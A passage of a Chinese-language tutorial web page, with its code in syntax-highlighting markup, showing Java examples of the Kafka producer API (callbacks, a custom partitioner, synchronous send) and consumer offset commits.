punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Properties<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>ExecutionException<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CustomProducer</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> ExecutionException<span class="token punctuation">,</span> InterruptedException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        Properties props <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"bootstrap.servers"</span><span class="token punctuation">,</span> <span class="token string">"hadoop102:9092"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//kafka集群，broker-list</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"acks"</span><span class="token punctuation">,</span> <span class="token string">"all"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"retries"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//重试次数</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"batch.size"</span><span class="token punctuation">,</span> <span class="token number">16384</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//批次大小</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"linger.ms"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//等待时间</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"buffer.memory"</span><span class="token punctuation">,</span> <span class="token number">33554432</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//RecordAccumulator缓冲区大小</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"key.serializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringSerializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value.serializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringSerializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Producer<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> producer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">KafkaProducer</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>props<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            producer<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ProducerRecord</span><span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span><span class="token punctuation">(</span><span class="token string">"first"</span><span class="token punctuation">,</span> Integer<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> Integer<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Callback</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//回调函数，该方法会在Producer收到ack时调用，为异步调用</span>                <span class="token annotation punctuation">@Override</span>                <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onCompletion</span><span class="token punctuation">(</span>RecordMetadata metadata<span class="token punctuation">,</span> Exception exception<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>exception <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"success->"</span> <span class="token operator">+</span> metadata<span class="token punctuation">.</span><span class="token function">offset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span> <span class="token keyword">else</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                        exception<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>                <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        producer<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-3-分区器"><a href="#1-3-分区器" class="headerlink" title="1.3 分区器"></a>1.3 分区器</h3><p><strong>1）</strong> 默认的分区器 DefaultPartitioner</p><p><strong>2）</strong> 自定义分区器 </p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyPartitioner</span> <span class="token keyword">implements</span> <span class="token class-name">Partitioner</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 计算某条消息要发送到哪个分区     * @param topic 主题     * @param key   消息的key     * @param keyBytes 消息的key序列化后的字节数组     * @param value 消息的value     * @param valueBytes   消息的value序列化后的字节数组     * @param cluster     * @return     *     * 需求: 以molly主题为例，2个分区     *       消息的 value包含"molly"的 进入0号分区     *       其他的消息进入1号分区     */</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">partition</span><span class="token punctuation">(</span>String topic<span class="token punctuation">,</span> Object key<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> keyBytes<span class="token punctuation">,</span> Object value<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> valueBytes<span class="token punctuation">,</span> Cluster cluster<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        String msgValue <span class="token operator">=</span> value<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> partition <span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>msgValue<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"molly"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            partition <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">else</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            partition <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> partition<span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 收尾工作     */</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 读取配置的     * @param configs     */</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">configure</span><span class="token punctuation">(</span>Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> <span class="token operator">?</span><span class="token operator">></span> configs<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-4-同步发送API"><a href="#1-4-同步发送API" class="headerlink" title="1.4 同步发送API"></a>1.4 同步发送API</h3><p>​    同步发送的意思就是，一条消息发送之后，会阻塞当前线程，直至返回ack。</p><p>由于send方法返回的是一个Future对象，根据Futrue对象的特点，我们也可以实现同步发送的效果，只需在调用Future对象的get方发即可。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>molly<span class="token punctuation">.</span>kafka<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span>KafkaProducer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span>Producer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span>ProducerRecord<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Properties<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>ExecutionException<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CustomProducer</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> ExecutionException<span class="token punctuation">,</span> InterruptedException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        Properties props <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"bootstrap.servers"</span><span class="token punctuation">,</span> <span class="token string">"hadoop102:9092"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//kafka集群，broker-list</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"acks"</span><span class="token punctuation">,</span> <span class="token string">"all"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"retries"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//重试次数</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"batch.size"</span><span class="token punctuation">,</span> <span class="token number">16384</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//批次大小</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"linger.ms"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//等待时间</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"buffer.memory"</span><span class="token punctuation">,</span> <span class="token number">33554432</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//RecordAccumulator缓冲区大小</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"key.serializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringSerializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value.serializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringSerializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Producer<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> producer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">KafkaProducer</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>props<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            producer<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ProducerRecord</span><span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span><span class="token punctuation">(</span><span class="token string">"first"</span><span class="token punctuation">,</span> Integer<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> Integer<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        producer<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-Consumer-API"><a href="#2-Consumer-API" class="headerlink" title="2 Consumer API"></a>2 Consumer API</h2><p>Consumer消费数据时的可靠性是很容易保证的，因为数据在Kafka中是持久化的，故不用担心数据丢失问题。</p><p>由于consumer在消费过程中可能会出现断电宕机等故障，consumer恢复后，需要从故障前的位置的继续消费，所以consumer需要实时记录自己消费到了哪个offset，以便故障恢复后继续消费。</p><p>所以offset的维护是Consumer消费数据是必须考虑的问题。</p><h3 id="2-1-自动提交offset"><a href="#2-1-自动提交offset" class="headerlink" title="2.1 自动提交offset"></a>2.1 自动提交offset</h3><p>1）编写代码</p><p>需要用到的类：</p><p>KafkaConsumer：需要创建一个消费者对象，用来消费数据</p><p>ConsumerConfig：获取所需的一系列配置参数</p><p>ConsuemrRecord：每条数据都要封装成一个ConsumerRecord对象</p><p>为了使我们能够专注于自己的业务逻辑，Kafka提供了自动提交offset的功能。 </p><p>自动提交offset的相关参数：</p><p>enable.auto.commit：是否开启自动提交offset功能</p><p>auto.commit.interval.ms：自动提交offset的时间间隔</p><p>2）消费者自动提交offset</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>molly<span class="token punctuation">.</span>kafka<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>consumer<span class="token punctuation">.</span>ConsumerRecord<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>consumer<span class="token punctuation">.</span>ConsumerRecords<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>consumer<span class="token punctuation">.</span>KafkaConsumer<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Arrays<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Properties<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CustomConsumer</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        Properties props <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"bootstrap.servers"</span><span class="token punctuation">,</span> <span class="token string">"hadoop102:9092"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"group.id"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"enable.auto.commit"</span><span class="token punctuation">,</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"auto.commit.interval.ms"</span><span class="token punctuation">,</span> <span class="token string">"1000"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"key.deserializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringDeserializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value.deserializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringDeserializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        KafkaConsumer<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> consumer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">KafkaConsumer</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>props<span class="token punctuation">)</span><span class="token punctuation">;</span>        consumer<span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span>Arrays<span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span><span class="token string">"first"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            ConsumerRecords<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> records <span class="token operator">=</span> consumer<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>ConsumerRecord<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> record <span class="token operator">:</span> records<span class="token punctuation">)</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"offset = %d, key = %s, value = %s%n"</span><span class="token punctuation">,</span> record<span class="token punctuation">.</span><span class="token function">offset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> record<span class="token punctuation">.</span><span class="token function">key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> record<span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-2-重置Offset"><a href="#2-2-重置Offset" class="headerlink" title="2.2 重置Offset"></a>2.2 重置Offset</h3><p>auto.offset.rest = earliest | latest | none |</p><h3 id="2-3-手动提交offset"><a href="#2-3-手动提交offset" class="headerlink" title="2.3 手动提交offset"></a>2.3 手动提交offset</h3><p>虽然自动提交offset十分简介便利，但由于其是基于时间提交的，开发人员难以把握offset提交的时机。因此Kafka还提供了手动提交offset的API。</p><p>手动提交offset的方法有两种：分别是commitSync（同步提交）和commitAsync（异步提交）。两者的相同点是，都会将本次poll的一批数据最高的偏移量提交；不同点是，commitSync阻塞当前线程，一直到提交成功，并且会自动失败重试（由不可控因素导致，也会出现提交失败）；而commitAsync则没有失败重试机制，故有可能提交失败。</p><p>1）同步提交offset</p><p>由于同步提交offset有失败重试机制，故更加可靠，以下为同步提交offset的示例。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>molly<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>consumer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>consumer<span class="token punctuation">.</span>ConsumerRecord<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>consumer<span class="token punctuation">.</span>ConsumerRecords<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>consumer<span class="token punctuation">.</span>KafkaConsumer<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Arrays<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Properties<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CustomComsumer</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        Properties props <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//Kafka集群</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"bootstrap.servers"</span><span class="token punctuation">,</span> <span class="token string">"hadoop102:9092"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//消费者组，只要group.id相同，就属于同一个消费者组</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"group.id"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"enable.auto.commit"</span><span class="token punctuation">,</span> <span class="token string">"false"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//关闭自动提交offset</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"key.deserializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringDeserializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value.deserializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringDeserializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        KafkaConsumer<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> consumer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">KafkaConsumer</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>props<span class="token punctuation">)</span><span class="token punctuation">;</span>        consumer<span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span>Arrays<span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span><span class="token string">"first"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//消费者订阅主题</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//消费者拉取数据</span>            ConsumerRecords<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> records <span class="token operator">=</span> consumer<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token keyword">for</span> <span class="token punctuation">(</span>ConsumerRecord<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> record <span class="token operator">:</span> records<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"offset = %d, key = %s, value = %s%n"</span><span class="token punctuation">,</span> record<span class="token punctuation">.</span><span class="token function">offset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> record<span class="token punctuation">.</span><span class="token function">key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> record<span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token 